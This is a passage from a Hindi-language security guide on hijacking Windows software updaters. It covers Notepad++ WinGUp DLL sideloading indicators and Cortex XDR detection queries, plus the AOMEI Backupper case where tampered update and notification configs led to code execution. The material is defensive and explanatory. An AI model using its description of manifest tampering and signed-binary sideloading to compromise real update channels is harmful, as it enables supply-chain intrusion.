- **BYO signed binary sideloading** को post-download detection pivot मानें: जब कोई signed vendor EXE अपने canonical install path से बाहर के DLL नाम को load करे (जैसे, Bitdefender का Temp/Downloads से `log.dll` load करना), और जब कोई updater temp से non-vendor signatures वाले installers drop/execute करे, तो alert करें।
- इस chain में देखे गए **malware-specific artifacts** को monitor करें (generic pivots के रूप में उपयोगी): mutex `Global\Jdhfv_1.0.1`, `%TEMP%` में `gup.exe` द्वारा असामान्य writes, और Lua-driven shellcode injection stages।
- Notepad++ ने v8.8.9 और उसके बाद के versions में WinGUp को मज़बूत किया: अब लौटाए गए XML पर हस्ताक्षर होते हैं (XMLDSig), और नए builds केवल transport पर भरोसा करने के बजाय downloaded installer की certificate + signature verification लागू करते हैं।<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE द्वारा sideload किया गया <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> द्वारा Notepad++ के अलावा किसी installer को launch करना</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

ये पैटर्न ऐसे किसी भी updater पर लागू होते हैं जो unsigned manifests स्वीकार करता है या installer signers को pin करने में विफल रहता है—network hijack + malicious installer + BYO-signed sideloading से “विश्वसनीय” updates के रूप में remote code execution हो सकता है।

### दूसरे update trigger के रूप में notification configuration

एक updater अलग-अलग remote configurations का उपयोग **content तैयार करने और उसका execution शुरू करने** के लिए कर सकता है। इसके लिए configurations या उनके responses पर नियंत्रण होना आवश्यक है; reports यह नहीं बतातीं कि origin तक पहुंच कैसे हासिल की गई। AOMEI मामले में, `down_html.ini` ने archive URL, version (`thrid`) और MD5 (`Val`) चुना; attacker ने version बढ़ाया और URL तथा उससे मेल खाने वाला checksum बदल दिया। यह ऊपर बताया गया [metadata trust-boundary failure](#2-hijacking-the-update-channel-to-run-code-as-system) है। अतिरिक्त execution path `Notifycfg.ini` था: इसने `ABNotify.exe` को WebView में स्थानीय `file:///` URL के जरिए निकाले गए `upgrade-now.html` को load करने का निर्देश दिया। पेज ने अपने आप एक साथ वाली executable पर navigation किया, जिसे WebView ने system shell को सौंप दिया। child process को notifier के privileges मिले; इससे वह अपने आप SYSTEM तक elevate नहीं हुआ।<sup>[[17]](#references)[[18]](#references)</sup>

Google ने छेड़छाड़ की गई `Notifycfg.ini` की भी report दी, जिसमें 35,000 से अधिक बार दोहराए गए dummy sections थे, जिन्होंने इस client के सामान्य version gate को पार कर लिया। यह report किसी सामान्य parser bypass को साबित नहीं करती। attacker ने remote files को पांच से दस मिनट की windows के बाद पहले जैसा कर दिया, इसलिए केवल उन्हीं windows के दौरान polling करने वाले clients को बदली हुई configuration मिली। इस notification channel में एक अलग [WebDAV/NTLM coercion lure](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) भी था, जिसके लिए archive को execute करना जरूरी नहीं था।<sup>[[18]](#references)</sup>

---
## References
- [1] [सलाह – Windows के लिए Netskope Client – Rogue Server के जरिए Local Privilege Escalation (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre और Razer Synapse 4 पर Pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent में writable files के जरिए Local Privilege Escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent में Privilege escalation](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors ने Notepad++ Supply Chain का शोषण किया](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure घटना का अपडेट](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Windows के लिए Netskope Client में CVE-2025-0309 के fix को bypass करना](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage में Privilege Escalation bugs का पता लगाना](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: gRPC से SYSTEM तक](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – AOMEI Backupper supply-chain compromise](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group और Mandiant – क्षणिक Supply Chain Tampering की जांच](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
